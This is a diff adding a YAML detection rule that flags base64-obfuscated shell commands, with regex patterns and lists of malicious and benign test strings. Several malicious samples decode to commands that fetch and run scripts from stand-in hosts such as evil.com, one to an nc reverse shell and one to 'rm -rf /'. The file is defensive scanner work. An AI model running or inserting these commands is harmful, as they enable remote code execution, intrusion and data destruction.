@@ -1,0 +1,73 @@
+name: medium-13-base64-bash
+severity: medium
+description: >
+  Detects base64-encoded commands in bash/sh. Obfuscation technique for Unix/Linux attacks.
+
+patterns:
+  - name: bash-with-base64-decode
+    pattern: (?i)(bash|sh)\s+-c.*echo.*base64\s+(--decode|-d)
+    description: Detects bash -c with echo and base64 decode
+
+  - name: standalone-echo-base64-pipe
+    pattern: (?i)echo\s+[A-Za-z0-9+/=]{15,}\s*\|\s*base64\s+(--decode|-d)\s*\|\s*(bash|sh|eval)
+    description: Detects standalone echo piped through base64 to shell
+
+  - name: eval-with-echo-base64
+    pattern: (?i)eval.*echo\s+[A-Za-z0-9+/=]{15,}.*base64\s+(--decode|-d)
+    description: Detects eval with echo and base64 decode
+
+  - name: subshell-echo-base64
+    pattern: (?i)\$\(echo\s+[A-Za-z0-9+/=]{15,}.*base64\s+(--decode|-d)\)
+    description: Detects command substitution with echo and base64
+
+  - name: echo-base64-with-equals
+    pattern: (?i)echo\s+[A-Za-z0-9+/]+=+\s*\|\s*base64\s+(--decode|-d)
+    description: Detects echo with base64 ending in equals signs
+
+  - name: echo-base64-decode-shell
+    pattern: (?i)echo\s+.{10,}\s*\|\s*base64\s+(--decode|-d)\s*\|\s*(bash|sh|eval)
+    description: Detects any echo content piped through base64 decode to shell execution
+
+malicious:
+  - 'bash -c "echo SGFja2Vk | base64 -d | bash"'
+  - "echo Y3VybCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaA== | base64 -d | bash"
+  - 'sh -c "echo $(echo ZXZpbF9jb21tYW5k | base64 -d)"'
+  - "echo cm0gLXJmIC8= | base64 --decode | sh"
+  - 'bash -c "$(echo d2dldCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5zaA== | base64 -d)"'
+  - "eval $(echo Y3VybCBodHRwOi8vbWFsd2FyZS5jb20vYmFja2Rvb3Iuc2g= | base64 -d)"
+  - "echo cHl0aG9uIC1jICdleGVjKC4uLik=' | base64 -d | bash"
+  - 'sh -c "echo SGFja2VyX2NvbW1hbmQ= | base64 --decode | sh"'
+  - "bash <<< $(echo Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vZHJvcHBlci5zaA== | base64 -d)"
+  - "echo d2dldCAtTyAtIGh0dHA6Ly9hdHRhY2tlci5jb20vbWFsd2FyZS5zaA== | base64 -d | sh"
+  - 'eval "$(echo Y3VybCBodHRwOi8vZXZpbC5jb20vY2xpY2tmaXguc2g= | base64 --decode)"'
+  - "bash -c $(echo cHdkOyBjdXJsIGh0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkLnNo | base64 -d)"
+  - "echo bmMgLWUgL2Jpbi9iYXNoIGV2aWwuY29tIDQ0NDQ= | base64 -d | bash"
+  - 'sh <<< "$(echo Y2htb2QgK3ggL3RtcC9tYWx3YXJlLnNoOyAvdG1wL21hbHdhcmUuc2g= | base64 -d)"'
+  - "echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zOyBvcy5zeXN0ZW0oImV2aWwiKSc= | base64 --decode | bash"
+
+benign:
+  - "bash script.sh"
+  - "sh -c 'ls -la'"
+  - "echo Hello World"
+  - "base64 file.txt"
+  - "echo test | base64"
+  - 'bash -c "pwd"'
+  - "sh test.sh"
+  - "eval $MY_VAR"
+  - "echo $PATH"
+  - "base64 -d < encoded.txt"
+  - "bash -c 'date'"
+  - "sh -c 'whoami'"
+  - "echo message > file.txt"
+  - "bash /usr/local/bin/script.sh"
+  - "base64 encode data.bin > output.b64"
+  - "sh -c 'grep pattern file.txt'"
+  - 'eval "echo test"'
+  - "echo $(date)"
+  - "bash -c 'uname -a'"
+  - "sh -c 'ps aux'"
+  - "base64 /etc/hostname"
+  - "echo result | tee output.txt"
+  - 'bash -c "cd /home && ls"'
+  - "sh local_script.sh"
+  - "eval local_command"
